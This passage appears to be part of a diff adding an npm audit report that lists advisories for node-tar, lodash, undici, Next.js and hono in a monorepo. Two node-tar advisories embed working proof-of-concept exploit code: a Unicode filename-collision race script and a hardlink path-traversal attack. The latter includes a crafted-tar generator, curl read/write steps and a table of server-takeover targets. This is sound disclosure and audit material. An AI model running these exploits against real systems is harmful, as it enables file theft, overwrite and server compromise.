contentA = 'A'.repeat(1000);\nconst contentB = 'B'.repeat(1000);\n\n// Key 1: \"f_ss\"\nconst header1 = new tar.Header({\n    path: 'collision_ss',\n    mode: 0o644,\n    size: contentA.length,\n});\nheader1.encode();\n\n// Key 2: \"f_ß\"\nconst header2 = new tar.Header({\n    path: 'collision_ß',\n    mode: 0o644,\n    size: contentB.length,\n});\nheader2.encode();\n\n// Write to stream\nstream.write(header1.block);\nstream.write(contentA);\nstream.write(Buffer.alloc(512 - (contentA.length % 512))); // Padding\n\nstream.write(header2.block);\nstream.write(contentB);\nstream.write(Buffer.alloc(512 - (contentB.length % 512))); // Padding\n\n// End\nstream.write(Buffer.alloc(1024));\nstream.end();\n\n// Extract\nconst extract = new tar.Unpack({\n    cwd: exploitDir,\n    // Ensure jobs is high enough to allow parallel processing if locks fail\n    jobs: 8 \n});\n\nstream.pipe(extract);\n\nextract.on('end', () => {\n    console.log('[*] Extraction complete');\n\n    // Check what exists\n    const files = fs.readdirSync(exploitDir);\n    console.log('[*] Files in exploit dir:', files);\n    files.forEach(f => {\n        const p = path.join(exploitDir, f);\n        const stat = fs.statSync(p);\n        const content = fs.readFileSync(p, 'utf8');\n        console.log(`File: ${f}, Inode: ${stat.ino}, Content: ${content.substring(0, 10)}... (Length: ${content.length})`);\n    });\n\n    if (files.length === 1 || (files.length === 2 && fs.statSync(path.join(exploitDir, files[0])).ino === fs.statSync(path.join(exploitDir, files[1])).ino)) {\n        console.log('\\[*] GOOD');\n    } else {\n        console.log('[-] No collision');\n    }\n});\n\n``````\n\n---\n\n### Impact\nThis is a **Race Condition** which enables **Arbitrary File Overwrite**. This vulnerability affects users and systems using **node-tar on macOS (APFS/HFS+)**. Because of using `NFD` Unicode normalization (in which `ß` and `ss` are different), conflicting paths do not have their order properly preserved under filesystems that ignore Unicode normalization (e.g., APFS (in which `ß` causes an inode collision with `ss`)). This enables an attacker to circumvent internal parallelization locks (`PathReservations`) using conflicting filenames within a malicious tar archive.\n\n---\n\n### Remediation\n\nUpdate `path-reservations.js` to use a normalization form that matches the target filesystem's behavior (e.g., `NFKD`), followed by first `toLocaleLowerCase('en')` and then `toLocaleUpperCase('en')`.\n\nUsers who cannot upgrade promptly, and who are programmatically using `node-tar` to extract arbitrary tarball data should filter out all `SymbolicLink` entries (as npm does) to defend against arbitrary file writes via this file system entry name collision issue.\n\n---",
+      "reported_by": null,
+      "title": "Race Condition in node-tar Path Reservations via Unicode Ligature Collisions on macOS APFS",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-23950"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.3",
+      "github_advisory_id": "GHSA-r6q2-hw4h-h46w",
+      "recommendation": "Upgrade to version 7.5.4 or later",
+      "patched_versions": ">=7.5.4",
+      "updated": "2026-01-21T01:05:50.000Z",
+      "cvss": {
+        "score": 8.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:L"
+      },
+      "cwe": [
+        "CWE-176"
+      ],
+      "url": "https://github.com/advisories/GHSA-r6q2-hw4h-h46w"
+    },
+    "1112453": {
+      "findings": [
+        {
+          "version": "4.17.21",
+          "paths": [
+            "web__ipai-control-center-docs>nextra>@theguild/remark-mermaid>mermaid>@mermaid-js/parser>langium>chevrotain>lodash-es"
+          ]
+        },
+        {
+          "version": "4.17.22",
+          "paths": [
+            "web__ipai-control-center-docs>nextra>@theguild/remark-mermaid>mermaid>lodash-es"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg\n- https://nvd.nist.gov/vuln/detail/CVE-2025-13465\n- https://github.com/lodash/lodash/commit/edadd452146f7e4bad4ea684e955708931d84d81\n- https://github.com/advisories/GHSA-xxjr-mmjv-4gpg",
+      "created": "2026-01-21T23:01:22.000Z",
+      "id": 1112453,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nLodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes. \n\nThe issue permits deletion of properties but does not allow overwriting their original behavior.  \n\n### Patches\n\nThis issue is patched on 4.17.23.",
+      "reported_by": null,
+      "title": "Lodash has Prototype Pollution Vulnerability in `_.unset` and `_.omit` functions",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-13465"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "lodash-es",
+      "vulnerable_versions": ">=4.0.0 <=4.17.22",
+      "github_advisory_id": "GHSA-xxjr-mmjv-4gpg",
+      "recommendation": "Upgrade to version 4.17.23 or later",
+      "patched_versions": ">=4.17.23",
+      "updated": "2026-01-21T23:01:23.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-xxjr-mmjv-4gpg"
+    },
+    "1112455": {
+      "findings": [
+        {
+          "version": "4.17.21",
+          "paths": [
+            "templates__saas-landing>recharts>lodash"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg\n- https://nvd.nist.gov/vuln/detail/CVE-2025-13465\n- https://github.com/lodash/lodash/commit/edadd452146f7e4bad4ea684e955708931d84d81\n- https://github.com/advisories/GHSA-xxjr-mmjv-4gpg",
+      "created": "2026-01-21T23:01:22.000Z",
+      "id": 1112455,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nLodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes. \n\nThe issue permits deletion of properties but does not allow overwriting their original behavior.  \n\n### Patches\n\nThis issue is patched on 4.17.23.",
+      "reported_by": null,
+      "title": "Lodash has Prototype Pollution Vulnerability in `_.unset` and `_.omit` functions",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-13465"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "lodash",
+      "vulnerable_versions": ">=4.0.0 <=4.17.22",
+      "github_advisory_id": "GHSA-xxjr-mmjv-4gpg",
+      "recommendation": "Upgrade to version 4.17.23 or later",
+      "patched_versions": ">=4.17.23",
+      "updated": "2026-01-21T23:01:23.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-xxjr-mmjv-4gpg"
+    },
+    "1112496": {
+      "findings": [
+        {
+          "version": "6.22.0",
+          "paths": [
+            "pkgs__github-app>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-g9mf-h72j-4rw9\n- https://github.com/nodejs/undici/commit/b04e3cbb569c1596f86c108e9b52c79d8475dcb3\n- https://nvd.nist.gov/vuln/detail/CVE-2026-22036\n- https://github.com/advisories/GHSA-g9mf-h72j-4rw9",
+      "created": "2026-01-14T21:06:08.000Z",
+      "id": 1112496,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nThe `fetch()` API supports chained HTTP encoding algorithms for response content according to RFC 9110 (e.g., Content-Encoding: gzip, br). This is also supported by the undici decompress interceptor.\n\nHowever, the number of links in the decompression chain is unbounded and the default maxHeaderSize allows a malicious server to insert thousands compression steps leading to high CPU usage and excessive memory allocation.\n\n### Patches\n\nUpgrade to 7.18.2 or 6.23.0.\n\n### Workarounds\n\nIt is possible to apply an undici interceptor and filter long `Content-Encoding` sequences manually.\n\n### References\n\n* https://hackerone.com/reports/3456148\n* https://github.com/advisories/GHSA-gm62-xv2j-4w53\n* https://curl.se/docs/CVE-2022-32206.html",
+      "reported_by": null,
+      "title": "Undici has an unbounded decompression chain in HTTP responses on Node.js Fetch API via Content-Encoding leads to resource exhaustion",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-22036"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "undici",
+      "vulnerable_versions": "<6.23.0",
+      "github_advisory_id": "GHSA-g9mf-h72j-4rw9",
+      "recommendation": "Upgrade to version 6.23.0 or later",
+      "patched_versions": ">=6.23.0",
+      "updated": "2026-01-22T20:17:08.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-g9mf-h72j-4rw9"
+    },
+    "1112592": {
+      "findings": [
+        {
+          "version": "16.0.10",
+          "paths": [
+            "templates__saas-landing>next"
+          ]
+        },
+        {
+          "version": "16.0.10",
+          "paths": [
+            "web__web>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-9g9p-9gw9-jx7f\n- https://nvd.nist.gov/vuln/detail/CVE-2025-59471\n- https://github.com/vercel/next.js/commit/500ec83743639addceaede95e95913398975156c\n- https://github.com/vercel/next.js/commit/e5b834d208fe0edf64aa26b5d76dcf6a176500ec\n- https://github.com/vercel/next.js/releases/tag/v15.5.10\n- https://github.com/vercel/next.js/releases/tag/v16.1.5\n- https://github.com/advisories/GHSA-9g9p-9gw9-jx7f",
+      "created": "2026-01-27T19:18:25.000Z",
+      "id": 1112592,
+      "npm_advisory_id": null,
+      "overview": "A DoS vulnerability exists in self-hosted Next.js applications that have `remotePatterns` configured for the Image Optimizer. The image optimization endpoint (`/_next/image`) loads external images entirely into memory without enforcing a maximum size limit, allowing an attacker to cause out-of-memory conditions by requesting optimization of arbitrarily large images. This vulnerability requires that `remotePatterns` is configured to allow image optimization from external domains and that the attacker can serve or control a large image on an allowed domain.\n\nStrongly consider upgrading to 15.5.10 and 16.1.5 to reduce risk and prevent availability issues in Next applications.",
+      "reported_by": null,
+      "title": "Next.js self-hosted applications vulnerable to DoS via Image Optimizer remotePatterns configuration",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-59471"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=15.6.0-canary.0 <16.1.5",
+      "github_advisory_id": "GHSA-9g9p-9gw9-jx7f",
+      "recommendation": "Upgrade to version 16.1.5 or later",
+      "patched_versions": ">=16.1.5",
+      "updated": "2026-01-27T19:18:28.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-9g9p-9gw9-jx7f"
+    },
+    "1112593": {
+      "findings": [
+        {
+          "version": "14.2.35",
+          "paths": [
+            "web__ai-control-plane>next"
+          ]
+        },
+        {
+          "version": "14.0.4",
+          "paths": [
+            "web__billing-site>next"
+          ]
+        },
+        {
+          "version": "15.5.9",
+          "paths": [
+            "web__odoo-frontend-shell>next"
+          ]
+        },
+        {
+          "version": "14.2.3",
+          "paths": [
+            "web__web-backup-subscription-starter>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-9g9p-9gw9-jx7f\n- https://nvd.nist.gov/vuln/detail/CVE-2025-59471\n- https://github.com/vercel/next.js/commit/500ec83743639addceaede95e95913398975156c\n- https://github.com/vercel/next.js/commit/e5b834d208fe0edf64aa26b5d76dcf6a176500ec\n- https://github.com/vercel/next.js/releases/tag/v15.5.10\n- https://github.com/vercel/next.js/releases/tag/v16.1.5\n- https://github.com/advisories/GHSA-9g9p-9gw9-jx7f",
+      "created": "2026-01-27T19:18:25.000Z",
+      "id": 1112593,
+      "npm_advisory_id": null,
+      "overview": "A DoS vulnerability exists in self-hosted Next.js applications that have `remotePatterns` configured for the Image Optimizer. The image optimization endpoint (`/_next/image`) loads external images entirely into memory without enforcing a maximum size limit, allowing an attacker to cause out-of-memory conditions by requesting optimization of arbitrarily large images. This vulnerability requires that `remotePatterns` is configured to allow image optimization from external domains and that the attacker can serve or control a large image on an allowed domain.\n\nStrongly consider upgrading to 15.5.10 and 16.1.5 to reduce risk and prevent availability issues in Next applications.",
+      "reported_by": null,
+      "title": "Next.js self-hosted applications vulnerable to DoS via Image Optimizer remotePatterns configuration",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-59471"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=10.0.0 <15.5.10",
+      "github_advisory_id": "GHSA-9g9p-9gw9-jx7f",
+      "recommendation": "Upgrade to version 15.5.10 or later",
+      "patched_versions": ">=15.5.10",
+      "updated": "2026-01-27T19:18:28.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-9g9p-9gw9-jx7f"
+    },
+    "1112644": {
+      "findings": [
+        {
+          "version": "4.11.3",
+          "paths": [
+            "web__chatgpt_ipai_ai_studio>@modelcontextprotocol/sdk>@hono/node-server>hono"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/honojs/hono/security/advisories/GHSA-9r54-q6cx-xmh5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-24771\n- https://github.com/honojs/hono/commit/2cf60046d730df9fd0aba85178f3ecfe8212d990\n- https://github.com/advisories/GHSA-9r54-q6cx-xmh5",
+      "created": "2026-01-28T16:10:22.000Z",
+      "id": 1112644,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nA Cross-Site Scripting (XSS) vulnerability exists in the `ErrorBoundary` component of the hono/jsx library. Under certain usage patterns, untrusted user-controlled strings may be rendered as raw HTML, allowing arbitrary script execution in the victim's browser.\n\n## Details\n\nThe issue is in the `ErrorBoundary` component (`src/jsx/components.ts`). `ErrorBoundary` previously forced certain rendered output paths to be treated as raw HTML, bypassing the library's default escaping behavior. This could result in unescaped rendering when developers pass user-controlled strings directly as children, or when fallbackRender returns user-controlled strings (for example, reflecting error messages that contain attacker input).\n\nThis vulnerability is only exploitable when an application renders untrusted user input within `ErrorBoundary` without appropriate escaping or sanitization.\n\n## Impact\n\nSuccessful exploitation may allow attackers to execute arbitrary JavaScript in the victim’s browser (reflected XSS). Depending on the application context, this can lead to actions such as session compromise, data exfiltration, or performing unauthorized actions as the victim.\n\n## Affected Components\n\n* hono/jsx: `ErrorBoundary` component",
+      "reported_by": null,
+      "title": "Hono vulnerable to XSS through ErrorBoundary component ",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-24771"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "hono",
+      "vulnerable_versions": "<4.11.7",
+      "github_advisory_id": "GHSA-9r54-q6cx-xmh5",
+      "recommendation": "Upgrade to version 4.11.7 or later",
+      "patched_versions": ">=4.11.7",
+      "updated": "2026-01-28T16:10:24.000Z",
+      "cvss": {
+        "score": 4.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-9r54-q6cx-xmh5"
+    },
+    "1112646": {
+      "findings": [
+        {
+          "version": "16.0.10",
+          "paths": [
+            "templates__saas-landing>next"
+          ]
+        },
+        {
+          "version": "16.0.10",
+          "paths": [
+            "web__web>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/facebook/react/security/advisories/GHSA-83fc-fqcc-2hmg\n- https://github.com/vercel/next.js/security/advisories/GHSA-h25m-26qc-wcjf\n- https://nvd.nist.gov/vuln/detail/CVE-2026-23864\n- https://vercel.com/changelog/summary-of-cve-2026-23864\n- https://github.com/advisories/GHSA-h25m-26qc-wcjf",
+      "created": "2026-01-28T15:38:01.000Z",
+      "id": 1112646,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability affects certain React Server Components packages for versions 19.0.x, 19.1.x, and 19.2.x and frameworks that use the affected packages, including Next.js 13.x, 14.x, 15.x, and 16.x using the App Router. The issue is tracked upstream as [CVE-2026-23864](https://github.com/facebook/react/security/advisories/GHSA-83fc-fqcc-2hmg).\n\nA specially crafted HTTP request can be sent to any App Router Server Function endpoint that, when deserialized, may trigger excessive CPU usage, out-of-memory exceptions, or server crashes. This can result in denial of service in unpatched environments.",
+      "reported_by": null,
+      "title": "Next.js HTTP request deserialization can lead to DoS when using insecure React Server Components",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "next",
+      "vulnerable_versions": ">=16.0.0-beta.0 <16.0.11",
+      "github_advisory_id": "GHSA-h25m-26qc-wcjf",
+      "recommendation": "Upgrade to version 16.0.11 or later",
+      "patched_versions": ">=16.0.11",
+      "updated": "2026-01-28T15:38:02.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-502"
+      ],
+      "url": "https://github.com/advisories/GHSA-h25m-26qc-wcjf"
+    },
+    "1112648": {
+      "findings": [
+        {
+          "version": "15.5.9",
+          "paths": [
+            "web__odoo-frontend-shell>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/facebook/react/security/advisories/GHSA-83fc-fqcc-2hmg\n- https://github.com/vercel/next.js/security/advisories/GHSA-h25m-26qc-wcjf\n- https://nvd.nist.gov/vuln/detail/CVE-2026-23864\n- https://vercel.com/changelog/summary-of-cve-2026-23864\n- https://github.com/advisories/GHSA-h25m-26qc-wcjf",
+      "created": "2026-01-28T15:38:01.000Z",
+      "id": 1112648,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability affects certain React Server Components packages for versions 19.0.x, 19.1.x, and 19.2.x and frameworks that use the affected packages, including Next.js 13.x, 14.x, 15.x, and 16.x using the App Router. The issue is tracked upstream as [CVE-2026-23864](https://github.com/facebook/react/security/advisories/GHSA-83fc-fqcc-2hmg).\n\nA specially crafted HTTP request can be sent to any App Router Server Function endpoint that, when deserialized, may trigger excessive CPU usage, out-of-memory exceptions, or server crashes. This can result in denial of service in unpatched environments.",
+      "reported_by": null,
+      "title": "Next.js HTTP request deserialization can lead to DoS when using insecure React Server Components",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "next",
+      "vulnerable_versions": ">=15.5.1-canary.0 <15.5.10",
+      "github_advisory_id": "GHSA-h25m-26qc-wcjf",
+      "recommendation": "Upgrade to version 15.5.10 or later",
+      "patched_versions": ">=15.5.10",
+      "updated": "2026-01-28T15:38:02.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-502"
+      ],
+      "url": "https://github.com/advisories/GHSA-h25m-26qc-wcjf"
+    },
+    "1112653": {
+      "findings": [
+        {
+          "version": "14.2.35",
+          "paths": [
+            "web__ai-control-plane>next"
+          ]
+        },
+        {
+          "version": "14.0.4",
+          "paths": [
+            "web__billing-site>next"
+          ]
+        },
+        {
+          "version": "14.2.3",
+          "paths": [
+            "web__web-backup-subscription-starter>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/facebook/react/security/advisories/GHSA-83fc-fqcc-2hmg\n- https://github.com/vercel/next.js/security/advisories/GHSA-h25m-26qc-wcjf\n- https://nvd.nist.gov/vuln/detail/CVE-2026-23864\n- https://vercel.com/changelog/summary-of-cve-2026-23864\n- https://github.com/advisories/GHSA-h25m-26qc-wcjf",
+      "created": "2026-01-28T15:38:01.000Z",
+      "id": 1112653,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability affects certain React Server Components packages for versions 19.0.x, 19.1.x, and 19.2.x and frameworks that use the affected packages, including Next.js 13.x, 14.x, 15.x, and 16.x using the App Router. The issue is tracked upstream as [CVE-2026-23864](https://github.com/facebook/react/security/advisories/GHSA-83fc-fqcc-2hmg).\n\nA specially crafted HTTP request can be sent to any App Router Server Function endpoint that, when deserialized, may trigger excessive CPU usage, out-of-memory exceptions, or server crashes. This can result in denial of service in unpatched environments.",
+      "reported_by": null,
+      "title": "Next.js HTTP request deserialization can lead to DoS when using insecure React Server Components",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "next",
+      "vulnerable_versions": ">=13.0.0 <15.0.8",
+      "github_advisory_id": "GHSA-h25m-26qc-wcjf",
+      "recommendation": "Upgrade to version 15.0.8 or later",
+      "patched_versions": ">=15.0.8",
+      "updated": "2026-01-28T15:38:02.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-502"
+      ],
+      "url": "https://github.com/advisories/GHSA-h25m-26qc-wcjf"
+    },
+    "1112659": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            "web__mobile>expo>@expo/cli>tar"
+          ]
+        },
+        {
+          "version": "7.4.3",
+          "paths": [
+            "web__platform-kit>supabase>tar"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-34x7-hfp2-rc4v\n- https://nvd.nist.gov/vuln/detail/CVE-2026-24842\n- https://github.com/isaacs/node-tar/commit/f4a7aa9bc3d717c987fdf1480ff7a64e87ffdb46\n- https://github.com/advisories/GHSA-34x7-hfp2-rc4v",
+      "created": "2026-01-28T16:35:31.000Z",
+      "id": 1112659,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nnode-tar contains a vulnerability where the security check for hardlink entries uses different path resolution semantics than the actual hardlink creation logic. This mismatch allows an attacker to craft a malicious TAR archive that bypasses path traversal protections and creates hardlinks to arbitrary files outside the extraction directory.\n\n### Details\nThe vulnerability exists in `lib/unpack.js`. When extracting a hardlink, two functions handle the linkpath differently:\n\n**Security check in `[STRIPABSOLUTEPATH]`:**\n```javascript\nconst entryDir = path.posix.dirname(entry.path);\nconst resolved = path.posix.normalize(path.posix.join(entryDir, linkpath));\nif (resolved.startsWith('../')) { /* block */ }\n```\n\n**Hardlink creation in `[HARDLINK]`:**\n```javascript\nconst linkpath = path.resolve(this.cwd, entry.linkpath);\nfs.linkSync(linkpath, dest);\n```\n\n**Example:** An application extracts a TAR using `tar.extract({ cwd: '/var/app/uploads/' })`. The TAR contains entry `a/b/c/d/x` as a hardlink to `../../../../etc/passwd`.\n\n- **Security check** resolves the linkpath relative to the entry's parent directory: `a/b/c/d/ + ../../../../etc/passwd` = `etc/passwd`. No `../` prefix, so it **passes**.\n\n- **Hardlink creation** resolves the linkpath relative to the extraction directory (`this.cwd`): `/var/app/uploads/ + ../../../../etc/passwd` = `/etc/passwd`. This **escapes** to the system's `/etc/passwd`.\n\nThe security check and hardlink creation use different starting points (entry directory `a/b/c/d/` vs extraction directory `/var/app/uploads/`), so the same linkpath can pass validation but still escape. The deeper the entry path, the more levels an attacker can escape.\n\n### PoC\n#### Setup\n\nCreate a new directory with these files:\n\n```\npoc/\n├── package.json\n├── secret.txt          ← sensitive file (target)\n├── server.js           ← vulnerable server\n├── create-malicious-tar.js\n├── verify.js\n└── uploads/            ← created automatically by server.js\n    └── (extracted files go here)\n```\n\n**package.json**\n```json\n{ \"dependencies\": { \"tar\": \"^7.5.0\" } }\n```\n\n**secret.txt** (sensitive file outside uploads/)\n```\nDATABASE_PASSWORD=supersecret123\n```\n\n**server.js** (vulnerable file upload server)\n```javascript\nconst http = require('http');\nconst fs = require('fs');\nconst path = require('path');\nconst tar = require('tar');\n\nconst PORT = 3000;\nconst UPLOAD_DIR = path.join(__dirname, 'uploads');\nfs.mkdirSync(UPLOAD_DIR, { recursive: true });\n\nhttp.createServer((req, res) => {\n  if (req.method === 'POST' && req.url === '/upload') {\n    const chunks = [];\n    req.on('data', c => chunks.push(c));\n    req.on('end', async () => {\n      fs.writeFileSync(path.join(UPLOAD_DIR, 'upload.tar'), Buffer.concat(chunks));\n      await tar.extract({ file: path.join(UPLOAD_DIR, 'upload.tar'), cwd: UPLOAD_DIR });\n      res.end('Extracted\\n');\n    });\n  } else if (req.method === 'GET' && req.url === '/read') {\n    // Simulates app serving extracted files (e.g., file download, static assets)\n    const targetPath = path.join(UPLOAD_DIR, 'd', 'x');\n    if (fs.existsSync(targetPath)) {\n      res.end(fs.readFileSync(targetPath));\n    } else {\n      res.end('File not found\\n');\n    }\n  } else if (req.method === 'POST' && req.url === '/write') {\n    // Simulates app writing to extracted file (e.g., config update, log append)\n    const chunks = [];\n    req.on('data', c => chunks.push(c));\n    req.on('end', () => {\n      const targetPath = path.join(UPLOAD_DIR, 'd', 'x');\n      if (fs.existsSync(targetPath)) {\n        fs.writeFileSync(targetPath, Buffer.concat(chunks));\n        res.end('Written\\n');\n      } else {\n        res.end('File not found\\n');\n      }\n    });\n  } else {\n    res.end('POST /upload, GET /read, or POST /write\\n');\n  }\n}).listen(PORT, () => console.log(`http://localhost:${PORT}`));\n```\n\n**create-malicious-tar.js** (attacker creates exploit TAR)\n```javascript\nconst fs = require('fs');\n\nfunction tarHeader(name, type, linkpath = '', size = 0) {\n  const b = Buffer.alloc(512, 0);\n  b.write(name, 0); b.write('0000644', 100); b.write('0000000', 108);\n  b.write('0000000', 116); b.write(size.toString(8).padStart(11, '0'), 124);\n  b.write(Math.floor(Date.now()/1000).toString(8).padStart(11, '0'), 136);\n  b.write('        ', 148);\n  b[156] = type === 'dir' ? 53 : type === 'link' ? 49 : 48;\n  if (linkpath) b.write(linkpath, 157);\n  b.write('ustar\\x00', 257); b.write('00', 263);\n  let sum = 0; for (let i = 0; i < 512; i++) sum += b[i];\n  b.write(sum.toString(8).padStart(6, '0') + '\\x00 ', 148);\n  return b;\n}\n\n// Hardlink escapes to parent directory's secret.txt\nfs.writeFileSync('malicious.tar', Buffer.concat([\n  tarHeader('d/', 'dir'),\n  tarHeader('d/x', 'link', '../secret.txt'),\n  Buffer.alloc(1024)\n]));\nconsole.log('Created malicious.tar');\n```\n\n#### Run\n\n```bash\n# Setup\nnpm install\necho \"DATABASE_PASSWORD=supersecret123\" > secret.txt\n\n# Terminal 1: Start server\nnode server.js\n\n# Terminal 2: Execute attack\nnode create-malicious-tar.js\ncurl -X POST --data-binary @malicious.tar http://localhost:3000/upload\n\n# READ ATTACK: Steal secret.txt content via the hardlink\ncurl http://localhost:3000/read\n# Returns: DATABASE_PASSWORD=supersecret123\n\n# WRITE ATTACK: Overwrite secret.txt through the hardlink\ncurl -X POST -d \"PWNED\" http://localhost:3000/write\n\n# Confirm secret.txt was modified\ncat secret.txt\n```\n### Impact\n\nAn attacker can craft a malicious TAR archive that, when extracted by an application using node-tar, creates hardlinks that escape the extraction directory. This enables:\n\n**Immediate (Read Attack):** If the application serves extracted files, attacker can read any file readable by the process.\n\n**Conditional (Write Attack):** If the application later writes to the hardlink path, it modifies the target file outside the extraction directory.\n\n### Remote Code Execution / Server Takeover\n\n| Attack Vector | Target File | Result |\n|--------------|-------------|--------|\n| SSH Access | `~/.ssh/authorized_keys` | Direct shell access to server |\n| Cron Backdoor | `/etc/cron.d/*`, `~/.crontab` | Persistent code execution |\n| Shell RC Files | `~/.bashrc`, `~/.profile` | Code execution on user login |\n| Web App Backdoor | Application `.js`, `.php`, `.py` files | Immediate RCE via web requests |\n| Systemd Services | `/etc/systemd/system/*.service` | Code execution on service restart |\n| User Creation | `/etc/passwd` (if running as root) | Add new privileged user |\n\n## Data Exfiltration & Corruption\n\n1. **Overwrite arbitrary files** via hardlink escape + subsequent write operations\n2. **Read sensitive files** by creating hardlinks that point outside extraction directory\n3. **Corrupt databases** and application state\n4. **Steal credentials** from config files, `.env`, secrets",
+      "reported_by": null,
+      "title": "node-tar Vulnerable to Arbitrary File Creation/Overwrite via Hardlink Path Traversal",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-24842"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar",
+      "vulnerable_versions": "<7.5.7",
+      "github_advisory_id": "GHSA-34x7-hfp2-rc4v",
+      "recommendation": "Upgrade to version 7.5.7 or later",
+      "patched_versions": ">=7.5.7",
+      "updated": "2026-01-28T16:35:31.000Z",
+      "cvss": {
+        "score": 8.2,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-59"
+      ],
+      "url": "https://github.com/advisories/GHSA-34x7-hfp2-rc4v"
+    },
+    "1112677": {
+      "findings": [
+        {
+          "version": "4.11.3",
+          "paths": [
+            "web__chatgpt_ipai_ai_studio>@modelcontextprotocol/sdk>@hono/node-server>hono"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
